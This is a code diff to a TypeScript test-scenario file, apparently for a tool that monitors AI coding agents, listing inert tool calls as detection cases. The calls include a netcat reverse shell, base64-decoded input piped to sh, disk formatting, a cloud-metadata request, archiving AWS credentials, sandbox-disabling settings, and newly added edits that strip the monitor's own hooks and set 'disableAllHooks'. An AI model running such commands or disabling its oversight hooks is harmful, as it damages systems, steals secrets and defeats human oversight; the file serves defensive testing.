@@ -31,6 +31,7 @@ export interface ScenarioDefinition {
 }
 const bash = (command: string): ScenarioCall => ({ tool: "Bash", parameters: { command } });
 const write = (path: string, content: string): ScenarioCall => ({ tool: "Write", parameters: { file_path: path, content }, file: "written" });
+const edit = (path: string, from: string, to: string): ScenarioCall => ({ tool: "Edit", parameters: { file_path: path, old_string: from, new_string: to }, file: "written" });
 const read = (path: string): ScenarioCall => ({ tool: "Read", parameters: { file_path: path }, file: "read" });
 // Inert event parameters only. Nothing in a scenario is executed or fetched.
 const fakeKey = ["sk", "live", "51Dm0Q7vK2pX9rT4wZ8nB3cF"].join("_");
@@ -41,7 +42,7 @@ export const COMMUNITY_SCENARIOS: ReadonlyArray<{ id: string; calls: ScenarioCal
   { id: "supply-chain", calls: [{ tool: "mcp__untrusted__read", server: "untrusted", parameters: { path: "/home/case/repo/README.md" } }, bash("claude plugin install synthetic"), bash("pip install synthetic --extra-index-url https://packages.example.invalid/simple"), write("/home/case/.claude/settings.json", '{"hooks":{},"sandbox":false}'), write("/home/case/.claude.json", '{"mcpServers":{}}'), bash("echo '{}' > /home/case/.claude.json"), read("/home/case/repo/CLAUDE.md")] },
   { id: "sql", calls: [{ tool: "query", server: "postgres", parameters: { query: "SELECT id FROM users UNION SELECT secret FROM vault" } }] },
   { id: "commands", calls: [bash("mkfs.ext4 /dev/synthetic"), bash("echo c3ludGhldGlj | base64 -d | sh"), bash("nc -e sh 127.0.0.1 9000"), bash("curl http://169.254.169.254/latest/meta-data/"), bash("tar czf /tmp/credentials.tgz /home/case/.aws"), bash("ssh -R 9000:localhost:22 case@localhost"), bash("history -c"), bash("npm publish --dry-run"), bash("export OPENAI_BASE_URL=http://127.0.0.1:9000")] },
-  { id: "configuration", calls: [write("/home/case/.bashrc", "echo synthetic"), write("/home/case/repo/.git/hooks/pre-commit", "echo synthetic"), read("/home/case/.cursor/auth.json"), bash("GEMINI_SANDBOX=none synthetic"), write("/home/case/.omnodex/config.json", "{}"), bash("omnodex record pause"), write("/tmp/outside-workspace.txt", "synthetic")] },
+  { id: "configuration", calls: [write("/home/case/.bashrc", "echo synthetic"), write("/home/case/repo/.git/hooks/pre-commit", "echo synthetic"), read("/home/case/.cursor/auth.json"), bash("GEMINI_SANDBOX=none synthetic"), write("/home/case/.omnodex/config.json", "{}"), bash("omnodex record pause"), edit("/home/case/.claude/settings.json", '"hooks":[{"command":"node /home/case/.omnodex/bin/claude-hook-launcher.js","omnodex-managed":true}]', '"hooks":[]'), edit("/home/case/.claude/settings.json", '"model":"synthetic"', '"disableAllHooks":true,"model":"synthetic"'), write("/tmp/outside-workspace.txt", "synthetic")] },
   { id: "rate", calls: Array.from({ length: 205 }, (_, i) => ({ tool: "Read", parameters: { file_path: `/home/case/repo/src/module-${i}.ts` }, file: "read" as const })) },
 ];
 export const MIN_SCENARIO_SESSIONS = COMMUNITY_SCENARIOS.length + 4;
